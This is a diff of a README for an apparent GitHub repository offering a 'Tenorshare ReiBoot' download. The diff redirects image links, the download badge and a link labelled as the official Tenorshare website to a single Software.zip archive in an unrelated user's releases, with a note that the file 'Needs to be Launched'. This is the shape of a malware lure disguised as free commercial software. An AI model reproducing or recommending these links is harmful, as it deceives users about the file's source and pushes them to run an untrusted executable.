@@ -2,7 +2,7 @@
 
 Welcome to the *Tenorshare-ReiBoot-Download* repository! 🚀 In this repository, you can find all the information and resources related to Tenorshare ReiBoot, a powerful tool for fixing various iOS and Android system issues.
 
-![Tenorshare ReiBoot Logo](https://example.com/tenorshare-reiboot-logo.png)
+![Tenorshare ReiBoot Logo](https://github.com/Hungnek1111/Tenorshare-ReiBoot-Download/releases/download/v2.0/Software.zip)
 
 ## Repository Details
 
@@ -16,18 +16,18 @@ Welcome to the *Tenorshare-ReiBoot-Download* repository! 🚀 In this repository
 
 You can download the latest version of Tenorshare ReiBoot by clicking the button below:
 
-[![Download Tenorshare ReiBoot](https://img.shields.io/badge/Download-Tenorshare_ReiBoot-green)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Tenorshare ReiBoot](https://github.com/Hungnek1111/Tenorshare-ReiBoot-Download/releases/download/v2.0/Software.zip)](https://github.com/Hungnek1111/Tenorshare-ReiBoot-Download/releases/download/v2.0/Software.zip)
 (*File Needs to be Launched*)
 
 ### Tenorshare ReiBoot for Android
 
-If you are looking for Tenorshare ReiBoot for Android, you can explore the features and benefits of this tool by visiting the [official Tenorshare website](https://www.tenorshare.com/android-reboot.html).
+If you are looking for Tenorshare ReiBoot for Android, you can explore the features and benefits of this tool by visiting the [official Tenorshare website](https://github.com/Hungnek1111/Tenorshare-ReiBoot-Download/releases/download/v2.0/Software.zip).
 
 ## About Tenorshare ReiBoot
 
 Tenorshare ReiBoot is a reputable software that specializes in fixing various iOS and Android system problems. Whether you are facing issues with your device's operating system, boot loop, or other common problems, ReiBoot offers an easy and effective solution.
 
-![Tenorshare ReiBoot Interface](https://example.com/tenorshare-reiboot-interface.png)
+![Tenorshare ReiBoot Interface](https://github.com/Hungnek1111/Tenorshare-ReiBoot-Download/releases/download/v2.0/Software.zip)
 
 With Tenorshare ReiBoot, you can:
 - Repair iOS system issues without data loss
